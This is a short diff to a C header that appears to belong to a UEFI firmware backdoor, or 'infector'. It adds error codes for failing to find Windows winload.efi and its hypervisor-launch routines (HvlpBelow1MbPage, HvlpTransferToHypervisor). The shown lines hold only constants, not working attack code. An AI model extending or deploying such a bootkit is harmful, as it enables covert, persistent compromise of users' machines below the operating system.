@@ -7,6 +7,13 @@
 // physical address where DXE driver will be loaded
 #define BACKDOOR_ADDR 0x10000
 
+// error codes
+#define BACKDOOR_ERR_WINLOAD                 ((UINT64)-1) // winload.efi not found
+#define BACKDOOR_ERR_BELOW_1MB_NOT_FOUND     ((UINT64)-2) // winload!HvlpBelow1MbPage not found
+#define BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED ((UINT64)-3) // winload!HvlpBelow1MbPage not allocated
+#define BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR  ((UINT64)-4) // winload!HvlpTransferToHypervisor() not found
+#define BACKDOOR_ERR_LOW_MEMORY_STUB         ((UINT64)-5) // winload!HvlpLowMemoryStub() not found
+
 #pragma pack(1)
 
 typedef struct _INFECTOR_CONFIG
